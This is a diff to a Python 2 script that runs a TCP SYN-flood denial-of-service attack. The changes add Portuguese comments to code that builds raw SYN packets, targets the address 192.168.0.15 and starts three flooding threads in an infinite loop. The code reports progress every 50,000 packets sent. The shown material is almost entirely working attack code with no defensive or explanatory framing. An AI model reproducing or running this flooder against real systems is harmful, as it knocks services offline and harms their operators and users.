@@ -111,7 +111,7 @@ def attack(numero_thread, dest_ip):
         if contador > 49999:
             print 'Foram enviados ',contador,' mensagens de SYN pela thread ',numero_thread 
             contador=0
-            
+
         psh = pack('!4s4sBBH' , source_address , dest_address , placeholder , protocol , tcp_length);
         psh = psh + tcp_header;
          
@@ -143,22 +143,29 @@ s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
 HOST = '192.168.0.15'
 s.bind(('', 0))
 
-
-
 countdown(3)
 
-i = 0
-
+#Por aqui o endereco do IP que sera atacado
 dest_ip = '192.168.0.15'
 
+#Numero fixo de threads por enquanto, utilizaram a funcao atacck por enquanto
 ataque2 = Thread(target=attack,args=[1,dest_ip])
 ataque3 = Thread(target=attack,args=[2,dest_ip])
 ataque4 = Thread(target=attack,args=[3,dest_ip])
 
+#Entra em um loop infinito
 while 1:
+
+	#Canal onde ira receber mensagem	
 	msg = s.recvfrom(12000)
+
+	#Se receber mensagem
 	if msg:
+
+		#Mostra que esta atacando
 		show_begin(dest_ip)
+
+		#Inicia a threads do ataque
 		ataque2.start()
  		ataque3.start ()
         ataque4.start ()
